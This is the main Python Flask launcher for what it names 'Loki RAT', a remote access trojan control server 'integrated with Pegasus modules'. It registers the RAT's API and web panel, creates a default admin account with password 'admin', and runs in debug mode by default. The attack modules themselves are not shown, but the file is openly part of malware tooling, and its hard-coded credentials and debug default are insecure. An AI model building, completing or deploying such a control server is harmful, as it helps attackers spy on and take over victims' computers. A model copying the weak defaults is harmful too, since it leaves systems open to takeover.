#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Loki RAT Ana Uygulaması
Integrated with Pegasus modules
"""

import os
import sys
from flask import Flask, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from flask_migrate import Migrate # Import Migrate

# Lokal modülleri ekle
sys.path.append(os.path.join(os.path.dirname(__file__), 'server'))
sys.path.append(os.path.join(os.path.dirname(__file__), 'agent'))

from server.config import config
from server.models import db
from server.pegasus_api import api
from server.webui import webui

def create_app(config_name='default'):
    """Application factory"""
    app = Flask(__name__)
    app.config.from_object(config[config_name])
    
    # Initialize extensions
    db.init_app(app)
    migrate = Migrate(app, db) # Initialize Flask-Migrate
    
    # Register blueprints
    app.register_blueprint(api, url_prefix='/api')
    app.register_blueprint(webui, url_prefix='/')
    # Main web UI will be handled by webui blueprint

    # Add root route
    @app.route('/')
    def index():
        return redirect(url_for('webui.login'))
    
    # Create upload directory if it doesn't exist
    if not os.path.exists(app.config['UPLOAD_FOLDER']):
        os.makedirs(app.config['UPLOAD_FOLDER'])
    
    return app

def init_db(app):
    """Initialize database"""
    with app.app_context():
        db.create_all()
        
        # Create default admin user if not exists
        from server.models import User
        from server.webui import hash_and_salt
        
        admin_user = User.query.filter_by(username='admin').first()
        if not admin_user:
            print("Creating default admin user...")
            password_hash, salt = hash_and_salt('admin')
            admin_user = User(
                username='admin',
                password=password_hash,
                salt=salt
            )
            db.session.add(admin_user)
            db.session.commit()
            print("Default admin user created with password: admin")
        else:
            print("Admin user already exists")

def main():
    """Main application entry point"""
    app = create_app(os.getenv('FLASK_CONFIG', 'default'))
    
    # Initialize database
    init_db(app)
    
    # Run the application
    app.run(
        host=os.getenv('FLASK_HOST', '127.0.0.1'),
        port=int(os.getenv('FLASK_PORT', 8080)),
        debug=os.getenv('FLASK_DEBUG', 'True').lower() == 'true'
    )

if __name__ == '__main__':
    main()
